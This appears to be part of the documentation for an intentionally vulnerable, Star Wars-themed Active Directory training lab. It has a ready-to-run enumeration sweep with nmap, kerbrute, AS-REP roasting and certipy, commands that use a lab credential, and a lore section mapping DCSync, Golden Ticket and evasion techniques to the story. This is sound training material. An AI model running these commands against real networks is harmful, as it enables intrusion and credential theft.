| `\PIPE\PROFMAPAPI` | (RPC over named pipe) | MSPROFile services | rare, but seen |
| `\PIPE\ICertPassage` | 91AE6020- | ADCS RPC — ESC11 relay | `certipy req` over RPC |

Use `impacket-rpcdump 10.10.0.10` to list every interface bound and its endpoint.

---

## T. Putting it together — a 10-minute total enum sweep

```bash
TARGET=10.10.0.10
# 1. Network
sudo nmap -Pn -sS -sV -p- --min-rate 2000 -oN scan.tcp $TARGET
sudo nmap -Pn -sU -p 53,88,123,137,161,389,500,1434,5353 -oN scan.udp $TARGET
# 2. SMB
enum4linux-ng -A $TARGET | tee enum4.out
nxc smb $TARGET -u '' -p ''
nxc smb $TARGET -u 'guest' -p ''
# 3. RPC pipes
impacket-rpcdump $TARGET | tee rpcdump.out
impacket-lookupsid 'empire.local/'@$TARGET 10000 | tee sids.out
# 4. LDAP anon
ldapsearch -x -H ldap://$TARGET -s base -b "" "(objectclass=*)" | tee rootdse.out
# 5. DNS
dig @$TARGET empire.local AXFR | tee axfr.out
dig @$TARGET -t SRV _ldap._tcp.dc._msdcs.empire.local
# 6. Kerberos username enum
kerbrute userenum -d empire.local --dc $TARGET /usr/share/seclists/Usernames/Names/names.txt
# 7. AS-REP roast pass (no creds needed)
impacket-GetNPUsers empire.local/ -dc-ip $TARGET -no-pass -usersfile names.txt -format hashcat
# 8. Web
nmap -p 80,443,5985,8530,8000,8080 --script http-enum $TARGET
# 9. SQL Browser
nmap -p 1434 -sU --script ms-sql-info 10.10.0.14
# 10. ADCS
curl -sk http://10.10.0.12/certsrv/
```

If you found a credential along the way (AS-REP crack, SYSVOL cpassword, anon LDAP user attribute leak, sprayed password), pivot immediately into **authenticated** enum:

```bash
nxc smb,ldap,mssql,winrm,rdp 10.10.0.0/21 -u peter.parker -p 'EmpireLab2024!'
bloodhound-python -u peter.parker -p 'EmpireLab2024!' -d empire.local -ns 10.10.0.10 -c all
certipy find -u peter.parker@empire.local -p 'EmpireLab2024!' -dc-ip 10.10.0.10 -vulnerable -stdout
```

---

## U. ENUM ID summary table (000-bracket short ref)

| ID | Technique | Where |
|---|---|---|
| ENUM-001..005 | Network / port / IPv6 sweep | Kali |
| ENUM-006..016 | SMB / RPC null+auth / shares / SYSVOL / coercion gates | coruscant mostly |
| ENUM-017..025 | LDAP / ADWS / BloodHound / ADIDNS | any DC |
| ENUM-026..032 | Kerberos roast / preauth / delegation / pre2k | any DC |
| ENUM-033..036 | DNS forward+AXFR+dyn-update | any DC |
| ENUM-037..040 | NetBIOS / LLMNR / mDNS / WSD / WPAD | local L2 |
| ENUM-041..045 | HTTP / IIS / WebDAV / OWA-SCCM-WSUS endpoints | endor, others |
| ENUM-046..049 | MSSQL browser / authed / linked servers | kamino |
| ENUM-050 | WinRM | all |
| ENUM-051 | RDP | all |
| ENUM-052..053 | WMI / DCOM | local |
| ENUM-054 | SNMP | (gap, planned) |
| ENUM-055..058 | ADCS deep enum | endor |
| ENUM-059..061 | GPO / SYSVOL deep | coruscant |
| ENUM-062..070 | Local Windows enum | post-foothold |
| ENUM-071..072 | Hybrid / Entra | (partial) |
| ENUM-073..074 | EDR / Defender / AMSI | post-foothold |
| ENUM-075..080 | (reserved — see hosts/*.md per-VM cribs for the rest) | per-host |

---

## V. Per-host cribsheets

Each VM has its own page listing **exactly** what ports/pipes/shares/SPNs are reachable, with the enum command you'd actually run:

| Host | Page |
|---|---|
| `coruscant.empire.local` (10.10.0.10) | [`hosts/coruscant-corp.md`](hosts/coruscant-corp.md) |
| `deathstar.eu.empire.local` (10.10.0.11) | [`hosts/coruscant-eu.md`](hosts/coruscant-eu.md) |
| `endor.empire.local` (10.10.0.12) | [`hosts/endor-corp.md`](hosts/endor-corp.md) |
| `scarif.empire.local` (10.10.0.13) | [`hosts/scarif-corp.md`](hosts/scarif-corp.md) |
| `kamino.empire.local` (10.10.0.14) | [`hosts/kamino-corp.md`](hosts/kamino-corp.md) |
| `tatooine.empire.local` (10.10.0.100) | [`hosts/tatooine-corp.md`](hosts/tatooine-corp.md) |
| `yavin4.rebel.local` (10.20.0.10) | [`hosts/coruscant-finance.md`](hosts/coruscant-finance.md) |
| `neimoidia.trade.corp` (10.30.0.10) | [`hosts/coruscant-root.md`](hosts/coruscant-root.md) |

---

Next: [`03-credential-access.md`](03-credential-access.md). After enumeration you'll have hashes, tickets, sprayable passwords, ESC findings — that's where this turns into compromise.

---

# The EMPIRE AD Lab: Star Wars Lore & Thematic Mapping

Welcome to the **EMPIRE AD Lab**, where the intricacies of Active Directory align with the galactic struggle between the Galactic Empire, the Rebel Alliance, and the shadow syndicates. This section provides a conceptual thematic mapping between the AD concepts you are attacking and the Star Wars universe.

## The Galactic Topology

The lab topology represents the political structure of the galaxy. Just as trust relationships govern AD, diplomatic and military alliances govern the galaxy.

```mermaid
graph TD
    classDef empire fill:#000000,stroke:#ff0000,stroke-width:2px,color:#fff;
    classDef rebel fill:#2b5c8f,stroke:#ff9900,stroke-width:2px,color:#fff;
    classDef trade fill:#4a4a4a,stroke:#aaaaaa,stroke-width:2px,color:#fff;
    classDef highlight fill:#440000,stroke:#ff0000,stroke-width:3px,color:#fff;

    subgraph The Galactic Empire (empire.local)
        Coruscant["Coruscant (Root DC)<br/>coruscant.empire.local"]:::empire
        DeathStar["The Death Star (Child DC)<br/>deathstar.eu.empire.local"]:::highlight
        Scarif["Scarif Citadel (File Server)<br/>scarif.empire.local"]:::empire
        Kamino["Kamino Cloning Facility (SQL)<br/>kamino.empire.local"]:::empire
        Endor["Endor Shield Generator (CA)<br/>endor.empire.local"]:::empire
        Mandalore["Mandalore Mercenary Base (Linux)<br/>mandalore.empire.local"]:::empire
        Coruscant -- "Imperial Command" --> DeathStar
        Coruscant --- Scarif
        Coruscant --- Kamino
        Coruscant --- Endor
        Coruscant --- Mandalore
    end

    subgraph The Rebel Alliance (rebel.local)
        Yavin4["Yavin 4 Base<br/>yavin4.rebel.local"]:::rebel
    end

    subgraph The Trade Federation (trade.corp)
        Neimoidia["Cato Neimoidia<br/>neimoidia.trade.corp"]:::trade
    end

    Coruscant <-->|Espionage / External Trust| Yavin4
    Coruscant <-->|Treaty / Forest Trust| Neimoidia
```

## Infrastructure Mapping

Understanding the infrastructure is key to successfully executing your attack paths. Here is how the technical components of the EMPIRE AD lab map to the Star Wars universe:

### 1. The Core Domains
* **`empire.local` (The Galactic Empire):** The central root domain. This is the seat of the Emperor and the Imperial Senate. Taking over this domain is equivalent to taking over Coruscant. It controls all the core infrastructure.
* **`eu.empire.local` (The Death Star):** A child domain of `empire.local`. While it reports to the root domain, it holds immense power. Escaping the child domain to compromise the root domain is the equivalent of using the Death Star plans to destroy the Empire.
* **`rebel.local` (The Rebel Alliance):** An external forest. It has an external trust with the Empire (perhaps through espionage or captured spies). Moving laterally across this trust requires finding a weak link in the Rebel defenses.
* **`trade.corp` (The Trade Federation):** A separate forest with a bidirectional forest trust. The Empire uses them for resources, but you can forge trust tickets (Inter-Realm TGTs) to cross this boundary.

### 2. High-Value Targets (Servers)
* **`coruscant.empire.local` (Coruscant Root DC):** The ultimate prize. Achieving Domain Admin here gives you the keys to the galaxy.
* **`endor.empire.local` (Endor Shield Generator / ADCS):** Active Directory Certificate Services. If you can compromise the CA (via ESC1, ESC8, etc.), you can forge certificates for any user in the Empire, effectively bringing down the deflector shields.
* **`scarif.empire.local` (Scarif Citadel):** This file server hosts critical SMB shares. It is the repository of the Death Star plans. Look for exposed passwords in scripts or configuration files left by careless Imperial engineers.
* **`kamino.empire.local` (Kamino Facility):** The SQL Server. SQL injection or xp_cmdshell here can lead to a foothold. It represents the cloning facilities—a hidden source of power.
* **`mandalore.empire.local` (Mandalore Base):** The Linux-in-AD member. Contains local privilege escalations and cross-OS pivot opportunities. Represents the mercenary faction employed by the Empire.

### 3. Attack Paths and Tactics
* **Initial Access (The Smuggler's Route):** Finding an exposed SMB share or exploiting an LLMNR poisoning vulnerability (Responder) is like slipping past the Imperial blockade.
* **Kerberoasting (Bounty Hunting):** Requesting TGS tickets for service accounts and cracking them offline is like putting a bounty on a high-value target and cracking their encryption.
* **DCSync (The Force):** Using `secretsdump` to pull the `krbtgt` hash directly from the Domain Controller. It's an invisible, powerful attack that bypasses normal defenses.
* **Golden Ticket (Order 66):** Once you have the `krbtgt` hash, you can forge a TGT for any user, granting you infinite access. It is the ultimate executive order, overriding all security protocols.
* **Trust Abuse (Diplomatic Immunity):** Forging a trust ticket to cross from the Child Domain to the Root Domain.

## The Hacker's Code (Sith vs Jedi)
As you navigate the lab, remember that the tools you use define your path. Will you use noisy, aggressive tools (The Dark Side) that trigger every alarm, or will you use stealthy, precise tradecraft (The Light Side) to move undetected?

* **The Dark Side (Noisy):** Running `BloodHound` with all collection methods, spraying passwords across the entire domain, and dropping standard Mimikatz binaries to disk. It is powerful and fast, but leaves a massive trail.
* **The Light Side (Stealthy):** Targeted LDAP queries, memory-only execution via Covenant or Cobalt Strike, and careful evasion of logging (AMSI bypasses, ETW patching).

## Flag Locations (Holocrons)
Hidden throughout the EMPIRE AD lab are flags (Holocrons) that prove your mastery over the environment. Look for `FLAG-*.txt` files on desktops, hidden SMB shares, and within the SQL databases. 

**Remember:** 
* "Your focus determines your reality." - Qui-Gon Jinn. Focus on the attack paths mapped out in `PLAN.md`.
* "I find your lack of faith disturbing." - Darth Vader. If an exploit fails, check your syntax, your targeting, and the underlying misconfiguration. The lab is intentionally vulnerable.

May the Force be with you as you conquer the EMPIRE AD!
